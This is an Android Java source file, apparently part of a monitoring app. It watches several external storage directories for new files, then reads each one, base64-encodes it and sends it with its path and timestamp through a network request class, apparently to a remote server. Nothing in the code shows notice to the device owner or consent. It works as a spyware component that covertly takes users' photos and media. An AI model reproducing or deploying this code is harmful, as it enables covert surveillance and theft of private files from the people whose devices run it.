package custom.fileobserver;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;

import org.apache.commons.io.FileUtils;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.os.Environment;
import android.util.Log;

import com.inet.android.request.DataRequest;
import com.inet.android.request.FileRequest;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

/**
 * monitoringCreateMediaFiles. This class is responsible for the beginning and
 * end of the monitoring media files creation in memory
 * 
 * @author johny homicide
 * 
 */
public class SetStateImage {

	private static final String LOG_TAG = "monitorMediaFiles";
	private FileWatcher mWatcher = null;
	private final String TAG = "GetImage";
	private static SetStateImage instance;
	private static boolean state = false;
	protected static Context mContext;
	private ConvertDate date = null;
	private String time;
	private String imageTypeStr = "21";

	public static SetStateImage getInstance(Context ctx) {
		SetStateImage localInstance = instance;
		mContext = ctx;
		Logging.doLog(LOG_TAG, "Context= " + mContext.toString());
		if (localInstance == null) {
			synchronized (SetStateImage.class) {
				localInstance = instance;
				if (localInstance == null) {
					Logging.doLog(LOG_TAG, "localInstance = null");
					instance = localInstance = new SetStateImage();
				}
			}
		}
		return localInstance;
	}

	public boolean State() {
		return state;
	}

	/*
	 * Start monitoring the creation of files in memory
	 */
	public void StartWatcher() {
		state = true;
		date = new ConvertDate();

		String sdcard = Environment.getExternalStorageDirectory()
				.getAbsolutePath();
		String sdcard2 = "/sdcard2";
		String sdcardMnt = "/mnt/sdcard2";
		String sdcardExt = "/mnt/extSdCard";
		String sdcardSd = "/sdcard/.externalSD";

		ArrayList<String> dirList = new ArrayList<String>();
		dirList.add(sdcard);
		dirList.add(sdcard2);
		dirList.add(sdcardMnt);
		dirList.add(sdcardExt);
		dirList.add(sdcardSd);

		for (String item : dirList) {
			File file = new File(item);
			if (file.exists() && file.isDirectory()) {

				Logging.doLog(LOG_TAG, "FileWatcher = create" + item);
				mWatcher = new FileWatcher(item, true, FileWatcher.CREATE);
				Logging.doLog(LOG_TAG, "FileListener");

				mWatcher.setFileListener(mFileListener);
				Logging.doLog(LOG_TAG, "startWatcher");
				mWatcher.startWatching();
			}
		}

	}

	FileListener mFileListener = new FileListener() {

		@Override
		public void onFileCreated(String path) {
			Log.i(TAG, "onFileCreated " + path);
			String sendJSONStr = null;
			JSONObject object = new JSONObject();
			ConvertDate getDate = new ConvertDate();
			try {
				object.put("time", getDate.logTime());
				object.put("type", imageTypeStr);
				object.put("path", path);
				object.put("image", encodeFileToBase64Binary(path));

				// sendJSONStr = jsonObject.toString();
				sendJSONStr = object.toString();
			} catch (JSONException e) {
				Logging.doLog(LOG_TAG, "json сломался", "json сломался");
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			DataRequest file = new DataRequest(mContext);
			file.sendRequest(sendJSONStr); // добавить строку request
		}

		@Override
		public void onFileDeleted(String path) {
			Log.i(TAG, "onFileDeleted " + path);
		}

		@Override
		public void onFileModified(String path) {
			Log.i(TAG, "onFileModified " + path);
		}

		@Override
		public void onFileRenamed(String oldName, String newName) {
			Log.i(TAG, "onFileRenamed from: " + oldName + " to: " + newName);
		}

	};

	/*
	 * Stop monitoring the creation of files in memory
	 */
	private String encodeFileToBase64Binary(String fileName) throws IOException {

		File file = new File(fileName);
		byte[] bytes = FileUtils.readFileToByteArray(file);
		String encoded = android.util.Base64.encodeToString(bytes, 0);
		bytes = null;
		return encoded;
	}

	public void StopWatcher() {
		state = false;
		if (mWatcher != null)
			mWatcher.stopWatching();
	}
}